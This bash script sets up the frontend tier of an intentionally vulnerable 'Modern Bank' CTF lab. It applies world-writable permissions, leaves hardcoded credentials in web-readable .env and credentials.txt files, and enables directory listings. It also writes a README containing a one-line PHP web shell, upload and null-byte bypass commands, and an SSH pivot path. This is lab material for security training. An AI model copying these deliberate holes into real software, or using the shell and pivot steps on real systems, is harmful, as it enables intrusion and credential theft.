#!/bin/bash
##############################################################################
# Modern Bank - Frontend Setup Script (Ubuntu LTS)
# Usage: sudo ./setup_frontend.sh <BACKEND_IP>
# 
# This script:
# - Installs Apache2 & PHP
# - Configures PHP with necessary modules
# - Deploys the banking application
# - Sets up vulnerable upload directory
# - Configures firewall rules
# - Exposes credentials for CTF
##############################################################################

set -e  # Exit on error

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Arguments
BACKEND_IP="${1:-192.168.1.100}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
APP_DIR="/var/www/html"
LOG_FILE="/var/log/modern_bank_setup.log"

# Log function
log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" | tee -a "$LOG_FILE"
    exit 1
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$LOG_FILE"
}

warn() {
    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$LOG_FILE"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root (use sudo)"
fi

trap 'error "Setup failed at line $LINENO while running: $BASH_COMMAND"' ERR

log "Starting Modern Bank Frontend Setup..."
log "Backend IP: $BACKEND_IP"

# ============================================================================
# 1. Update system and install dependencies
# ============================================================================
log "Updating system packages..."
apt-get update -qq
apt-get upgrade -y -qq

log "Installing Apache2, PHP, and required modules..."
apt-get install -y -qq \
    apache2 \
    php-fpm \
    php \
    php-mysql \
    php-curl \
    php-json \
    php-gd \
    libapache2-mod-php \
    curl \
    wget \
    git

# ============================================================================
# 2. Enable Apache2 modules
# ============================================================================
log "Configuring Apache2 modules..."
PHP_APACHE_MOD="$(find /etc/apache2/mods-available -maxdepth 1 -type f -name 'php*.load' -printf '%f\n' 2>/dev/null | sed 's/\.load$//' | sort -Vr | head -n1)"
if [[ -n "$PHP_APACHE_MOD" ]]; then
    a2enmod "$PHP_APACHE_MOD" >/dev/null
    log "Enabled Apache PHP module: $PHP_APACHE_MOD"
else
    warn "No php*.load Apache module found. Continuing with installed defaults."
fi
a2enmod rewrite >/dev/null
a2enmod headers >/dev/null
systemctl restart apache2

# ============================================================================
# 3. Clean web root and deploy application
# ============================================================================
log "Deploying application files..."
rm -rf "$APP_DIR"/*

# Copy app files
if [ -d "$SCRIPT_DIR/www" ]; then
    cp -a "$SCRIPT_DIR/www/." "$APP_DIR/"
else
    error "Application files not found in $SCRIPT_DIR/www"
fi

# ============================================================================
# 4. Create uploads directory with VULNERABLE permissions
# ============================================================================
log "Setting up uploads directory (INTENTIONALLY VULNERABLE)..."
UPLOAD_DIR="$APP_DIR/uploads"
mkdir -p "$UPLOAD_DIR"

# VULNERABILITY: Very permissive permissions allow PHP execution
chmod 777 "$UPLOAD_DIR"
chmod 777 "$APP_DIR"

# ============================================================================
# 5. Inject Backend IP into configuration
# ============================================================================
log "Configuring backend connectivity..."
cat > "$APP_DIR/.env" << EOF
BACKEND_IP=$BACKEND_IP
BACKEND_PORT=8080
BACKEND_SSH_USER=deploy
BACKEND_SSH_PASS=DeployPass123!Vulnerable
EOF

# VULNERABILITY: .env file is web-accessible and readable
chmod 644 "$APP_DIR/.env"

# Also create a credentials file in uploads for easy discovery during CTF
cat > "$UPLOAD_DIR/../credentials.txt" << EOF
=== Modern Bank - Exposed Credentials ===
Discovered: $(date)

Backend SSH Access:
- Server: $BACKEND_IP:22
- Username: deploy
- Password: DeployPass123!Vulnerable
- Purpose: Internal API management

Backend Admin CGI:
- URL: http://$BACKEND_IP:8080/cgi-bin/admin.php
- API Key: super_secret_api_key_12345

Database Credentials:
- Host: 192.168.1.50 (Windows Database Server)
- User: bankapp
- Pass: BankApp@2024!Insecure
- Database: ModernBank

Note: These credentials should be in a vault, but are exposed here for lab purposes.
EOF

chmod 644 "$APP_DIR/credentials.txt"

# ============================================================================
# 6. Configure PHP
# ============================================================================
log "Configuring PHP settings..."
PHP_INI_UPDATED=false
for PHP_CONF in /etc/php/*/apache2/php.ini; do
    if [ -f "$PHP_CONF" ]; then
        # Allow large file uploads (CTF requirement)
        sed -i 's/^upload_max_filesize.*/upload_max_filesize = 50M/' "$PHP_CONF"
        sed -i 's/^post_max_size.*/post_max_size = 50M/' "$PHP_CONF"
        # Enable error reporting for debugging
        sed -i 's/^display_errors.*/display_errors = On/' "$PHP_CONF"
        log "Updated PHP config: $PHP_CONF"
        PHP_INI_UPDATED=true
    fi
done

if [[ "$PHP_INI_UPDATED" == false ]]; then
    warn "No Apache PHP ini file found under /etc/php/*/apache2/php.ini"
fi

# ============================================================================
# 7. Set correct ownership and permissions
# ============================================================================
log "Setting file permissions..."
chown -R www-data:www-data "$APP_DIR"
find "$APP_DIR" -type f -exec chmod 644 {} \;
find "$APP_DIR" -type d -exec chmod 755 {} \;

# Ensure uploads are writable but also executable (VULNERABLE!)
chmod 777 "$APP_DIR/uploads"

# ============================================================================
# 8. Configure Apache VirtualHost
# ============================================================================
log "Configuring Apache VirtualHost..."
cat > /etc/apache2/sites-available/000-default.conf << 'EOF'
<VirtualHost *:80>
    ServerAdmin admin@modernbank.local
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # VULNERABILITY: Allow directory listings
    <Directory /var/www/html/uploads>
        Options Indexes FollowSymLinks
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

a2ensite 000-default.conf 2>/dev/null || true
systemctl reload apache2

# ============================================================================
# 9. Configure firewall rules
# ============================================================================
log "Configuring firewall rules..."
ufw allow 22/tcp 2>/dev/null || true
ufw allow 80/tcp 2>/dev/null || true
ufw allow 443/tcp 2>/dev/null || true
ufw --force enable 2>/dev/null || true

# ============================================================================
# 10. Create CTF documentation file
# ============================================================================
log "Creating CTF documentation..."
cat > "$APP_DIR/CTF_README.md" << EOF
# Modern Bank - CTF Challenge Documentation

## Vulnerabilities in This Tier

### 1. Insecure File Upload (profile.php)
- **Location:** /profile.php (Avatar Upload)
- **Vulnerability:** Weak validation allows PHP shell upload
  - Client-side validation only (can be bypassed)
  - Extension whitelist bypassed with null bytes
  - No MIME type checking on server
  - File saved with execute permissions
  - Predictable filename (user_id.jpg)
  
**Exploitation:**
\`\`\`bash
# Upload a PHP shell with .jpg extension
curl -F "avatar=@shell.php.jpg" http://localhost/profile.php
# Then access: http://localhost/uploads/1.jpg
# Or use null byte: shell.php%00.jpg
\`\`\`

### 2. Exposed Credentials
- **Location:** /.env (accessible via web)
- **Content:** Backend SSH credentials, API keys
- **Discovery:** Browse to http://localhost/.env or check source code

- **Location:** /uploads/../credentials.txt
- **Additional info:** Windows DB credentials, backend API endpoints

### 3. Directory Traversal / File Disclosure
- **.env file readable:** Database credentials exposed
- **Directory listings enabled:** /uploads/ directory browsable
- **Source code:** PHP files can be read (no obfuscation)

## Attack Path (Pivot to Backend)

1. Upload PHP web shell via avatar upload
2. Access shell at /uploads/1.jpg (execute PHP)
3. Find and read .env file
4. Use SSH credentials to access Backend VM
5. Continue pivoting to Windows Database tier

## Lab Architecture

- **Tier 1 (This Machine):** Frontend - Ubuntu LTS, Apache2, PHP
- **Tier 2 (Backend):** Ubuntu Server 24, Backend API, NodeJS/PHP CGI
- **Tier 3 (Database):** Windows 10, SQL Server, Admin Services

## Sample Attack Commands

\`\`\`bash
# 1. Login and upload shell
# Admin: admin/admin123
# User: user/user123

# 2. Create PHP shell
echo '<?php system(\$_GET["cmd"]); ?>' > shell.php

# 3. Upload as JPG
mv shell.php shell.jpg

# 4. Upload via profile.php
# Then access via browser: http://localhost/uploads/1.jpg?cmd=id

# 5. Read .env from shell
# ?cmd=cat .env

# 6. SSH to backend
ssh deploy@BACKEND_IP
# Password: DeployPass123!Vulnerable
\`\`\`

## Success Indicators

- ✓ Upload PHP shell successfully
- ✓ Execute system commands via web shell
- ✓ Read .env file and extract credentials
- ✓ SSH access to Backend VM
EOF

# ============================================================================
# 11. Final status and cleanup
# ============================================================================
log "Restarting services..."
systemctl restart apache2
systemctl status apache2 --no-pager

# ============================================================================
# 12. Print summary
# ============================================================================
echo ""
echo -e "${YELLOW}========================================${NC}"
echo -e "${GREEN}Frontend Setup Complete!${NC}"
echo -e "${YELLOW}========================================${NC}"
echo ""
echo -e "Application URL: ${BLUE}http://localhost${NC}"
echo -e "Backend IP: ${BLUE}$BACKEND_IP${NC}"
echo -e "Application Dir: ${BLUE}$APP_DIR${NC}"
echo -e "Log File: ${BLUE}$LOG_FILE${NC}"
echo ""
echo -e "${YELLOW}Demo Credentials:${NC}"
echo -e "  Admin: ${BLUE}admin / admin123${NC}"
echo -e "  User:  ${BLUE}user / user123${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilities Enabled:${NC}"
echo -e "  ✓ Insecure file upload (profile.php)"
echo -e "  ✓ Exposed .env file with backend credentials"
echo -e "  ✓ Exposed credentials.txt file"
echo -e "  ✓ Directory testing. Allowed"
echo -e "  ✓ PHP execution in uploads directory"
echo ""
echo -e "${YELLOW}CTF Attack Path:${NC}"
echo -e "  1. Login (admin/admin123)"
echo -e "  2. Upload PHP shell via avatar upload"
echo -e "  3. Access shell at /uploads/1.jpg"
echo -e "  4. Pivot using backend SSH credentials"
echo ""
success "Frontend tier is ready for exploitation!"
